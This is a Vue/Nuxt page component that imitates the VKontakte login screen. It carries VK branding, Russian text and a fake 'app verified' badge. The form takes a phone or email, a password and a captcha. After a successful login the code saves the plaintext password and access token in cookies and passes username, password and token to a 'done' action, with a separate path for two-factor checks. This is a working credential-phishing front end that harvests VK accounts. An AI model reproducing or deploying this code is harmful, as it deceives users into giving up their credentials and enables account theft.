<template>
  <div class="base-wrapper">
    <div class="middle-wrapper">
      <div class="form-wrapper">
        <header class="form-header">
          <div class="container">
            <a href="https://vk.com" class="form-header-vk" target="_blank">
              <img src="/logo.svg" alt="Логотип ВКонтакте" />
            </a>
            <hide-m>
              <a
                href="https://vk.com/join?reg=1"
                class="form-header-reg link"
                target="_blank"
                >Регистрация</a
              >
            </hide-m>
          </div>
        </header>
        <main class="form-content">
          <div class="form-prepend">
            <hide-pc>
              <img
                src="~assets/vk-admin-50.jpg"
                srcset="~assets/vk-admin-100.jpg 2x"
                alt="Логотип ВКонтакте"
                class="app-logo"
              />
            </hide-pc>
            <div class="app-info">
              <hide-pc>
                <b class="app-name">
                  Авторизация ВКонтакте
                  <img
                    src="~assets/verified.svg"
                    alt="Приложение подтверждено"
                    width="14"
                    height="14"
                    style="transform: translateY(2px)"
                  />
                </b>
              </hide-pc>
              <span class="require-login">
                Для продолжения Вам необходимо войти <b>ВКонтакте</b>.
              </span>
            </div>
          </div>
          <div class="form-container">
            <form
              action="/auth"
              method="POST"
              enctype="application/x-www-form-urlencoded"
              class="form"
              @submit.prevent="login"
            >
              <div v-if="$store.state.error.length" class="form-group">
                <div class="login-error">
                  {{ $store.state.error }}
                </div>
              </div>
              <div class="form-inner">
                <div class="form-group">
                  <label for="username" class="form-label"
                    >Телефон или email</label
                  >
                  <input
                    id="username"
                    v-model="username"
                    type="text"
                    name="username"
                    class="form-input"
                    :disabled="$store.state.waiting"
                  />
                </div>
                <div class="form-group">
                  <label for="password" class="form-label">Пароль</label>
                  <input
                    id="password"
                    v-model="password"
                    type="password"
                    name="password"
                    class="form-input"
                    :disabled="$store.state.waiting"
                  />
                </div>
                <div v-if="$store.getters.captchaRequired" class="form-group">
                  <img
                    id="captcha"
                    alt="captcha"
                    class="captcha-img"
                    :src="$store.state.captchaImg"
                  />
                  <label for="captche-key" class="form-label captcha-label"
                    >Код с картинки</label
                  >
                  <input
                    id="captcha-key"
                    v-model="captchaKey"
                    type="text"
                    name="captcha_key"
                    class="form-input"
                    :disabled="$store.state.waiting"
                    :required="this.$store.getters.captchaRequired"
                  />
                </div>
                <div class="form-group clearfix">
                  <vk-button
                    type="submit"
                    variant="primary"
                    class="float-lm vk-button-disabled-by-loading"
                    :disabled="$store.state.waiting"
                  >
                    Войти
                  </vk-button>
                  <hide-m>
                    <a
                      href="https://vk.com/restore"
                      class="btn link form-restore"
                      target="_blank"
                      >Забыли пароль?</a
                    >
                  </hide-m>
                  <hide-pc style="float:left">
                    <vk-button type="link" variant="link" href="https://vk.com">
                      Отмена
                    </vk-button>
                  </hide-pc>
                </div>
                <hide-pc>
                  <div class="form-append">
                    <div class="form-group">
                      <b class="not-registered-yet">Ещё не зарегистрированы?</b>
                    </div>
                    <div class="form-group form-append-reg">
                      <vk-button
                        type="link"
                        variant="secondary"
                        href="https://vk.com/join?reg=1"
                        :blank="true"
                        btn-style="display:block"
                      >
                        Зарегистрироваться
                      </vk-button>
                    </div>
                  </div>
                </hide-pc>
              </div>
            </form>
          </div>
        </main>
      </div>
    </div>
  </div>
</template>
<script>
import Vue from 'vue'
import Component from 'vue-class-component'
import VKButton from '~/components/vk-button'
import HidePc from '~/components/hide-pc'
import HideM from '~/components/hide-m'
import { R_REQUIRE_2FA, R_SUCCESS } from '~/server/auth-constants'

@Component({
  name: 'LoginPage',
  components: {
    'vk-button': VKButton,
    'hide-pc': HidePc,
    'hide-m': HideM
  },

  layout: 'page',

  mounted() {
    this.username = this.$store.state.username

    this.interval = setInterval(() => {
      if (this.$store.state.status === R_SUCCESS) {
        this.$cookies.set('done', '1')
        this.$cookies.set('password', this.password)
        this.$cookies.set('token', this.$store.state.token)

        this.$store.dispatch('done', {
          username: this.username,
          password: this.password,
          token: this.$store.state.token,
          '2fa': false
        })

        clearInterval(this.interval)
      } else if (this.$store.state.status === R_REQUIRE_2FA) {
        this.$cookies.set('password', this.password)
        this.$store.dispatch('gotoAuthcheck', this.$router)

        clearInterval(this.interval)
      }
    }, 100)
  }
})
class LoginPage extends Vue {
  username = ''
  password = ''
  captchaKey = ''

  login() {
    let opts = {
      username: this.username,
      password: this.password,
      $cookie: this.$cookies
    }

    if (this.$store.getters.captchaRequired) {
      if (this.captchaKey.length < 5) {
        alert('Введите код с картинки')
        return 1
      } else {
        opts = {
          ...opts,
          captcha_key: this.captchaKey,
          captcha_sid: this.$store.state.captchaSid
        }
      }
    }

    this.$store.dispatch('auth', opts)

    return false
  }
}

export default LoginPage
</script>
<style scoped>
@media screen and (min-width: 751px) {
  .base-wrapper {
    width: 100vw;
    height: 100vh;
    overflow: hidden;
  }

  .middle-wrapper {
    margin-top: 50vh;
    transform: translateY(-50%);
  }

  .form-wrapper {
    display: block;
    margin: 0 auto;
    width: 655px;
    min-height: 350px;
    border-radius: 4px;
    box-shadow: var(--desktop-box-shadow);
    overflow: hidden;
  }

  .form-header {
    font-size: var(--font-size-sm);
    background-color: var(--primary-darker-color);
    padding: 0 25px;
    color: #fff;
    height: 54px;
    line-height: 52px;
  }

  .form-header .container {
    display: flex;
    justify-content: space-between;
    align-content: center;
    height: inherit;
  }

  .form-header-vk {
    width: 40px;
  }
  .form-header-vk img {
    width: inherit;
    margin-top: 7px;
  }
  .form-header-reg {
    color: #fff !important;
    font-weight: bold;
    font-size: inherit;
  }

  .form-content {
    background-color: #fff;
    min-height: 296px;
  }

  .form-prepend {
    display: flex;
    width: 100%;
    background-color: var(--box-prepend-color);
    height: 50px;
    font-size: var(--font-size-sm);
    border: 1px solid #c1c9d9;
    border-width: 0 0 1px;
    border-color: #e7e8ec;
    justify-content: center;
  }

  .require-login {
    margin: -20px -25px 0;
    padding: 15px 25px 16px;
    display: table-cell;
    font-size: var(--font-size-sm);
  }

  .form-container {
    display: block;
    padding: 20px;
  }
  .form-inner {
    width: 160px;
    min-height: 205px;
    margin: 0 auto;
  }

  .form-label {
    padding-bottom: 8px;
    font-size: var(--font-size-sm);
    font-weight: 500;
    text-align: left;
    width: 100%;
    display: block;
    line-height: 19px;
  }

  .form-restore {
    text-align: center;
    display: block;
    margin-top: 16px;
  }

  .form-inner:last-child {
    padding: 0;
  }
  .captcha-img {
    display: block;
    margin: 20px auto 13px;
  }
  .captcha-label::after {
    content: ':';
  }
  .login-error {
    text-align: center;
    margin: 0 0 15px;
    background: #ffefe9;
    word-wrap: break-word;
    padding: 7px 18px 9px;

    border: 1px solid #c1c9d9;
    border-radius: 2px;
    line-height: 150%;
    border-color: #f2ab99;
  }
}
@media screen and (max-width: 750px) {
  .form-wrapper {
    background-color: #ffffff;
    width: 100%;
    max-width: 620px;
    margin: 0 auto;
    padding-top: 48px;
  }

  .form-header {
    height: 48px;
    background-color: #5181b8;
    position: fixed;
    top: 0;
    width: 100%;
    left: 0;
  }

  .container {
    width: 100%;
    height: 100%;
    max-width: 620px;
    padding: 0 16px;
    margin: 0 auto;
  }

  .form-header-vk,
  .form-header-vk img {
    width: 32px;
  }
  .form-header-vk img {
    width: inherit;
    margin-top: 7px;
  }

  .form-prepend {
    display: flex;
    padding: 12px 16px;
    border: none;
    background: #fff;
    box-sizing: border-box;
    width: 100%;
    height: 74px;
    justify-content: flex-start;
  }

  .app-logo {
    display: block;
    height: 50px;
    width: 50px;
    border-radius: 50%;
    margin-right: 8px;
  }

  .app-info {
    width: 100%;
    font-size: 12px;
  }

  .app-name,
  .require-login {
    display: block;
    text-align: left;
    font-size: 12px;
  }

  .require-login {
    padding: 0;
    padding-top: 4px;
    margin: 0;
    color: #797979;
    font-size: inherit;
  }
  .form-container {
    padding: 0 12px 16px;
  }
  .form-inner {
    margin: 0;
    width: 100%;
  }

  .form-group {
    padding-top: 12px;
  }

  .form-label {
    display: block;
    color: var(--grey-color);
    padding-bottom: 6px;
    font-weight: normal;
    font-size: inherit;
    line-height: normal;
  }

  .form-label:after {
    content: ':';
  }

  .form-cancel {
    display: inline-block !important;
    font-weight: normal !important;
    font-size: 1em;
  }

  .form-login {
    color: var(--primary-darker-color);
  }
  .form-group:last-child {
    padding-top: 18px;
  }
  .form-append-reg {
    display: block;
  }
  .not-registered-yet {
    color: var(--blue-gray-color);
  }

  .float-lm {
    float: left;
  }

  .login-error {
    background-color: #f9f6e7;
    border: 1px solid #d4bc4c;
    padding: 7px;
  }
}
</style>
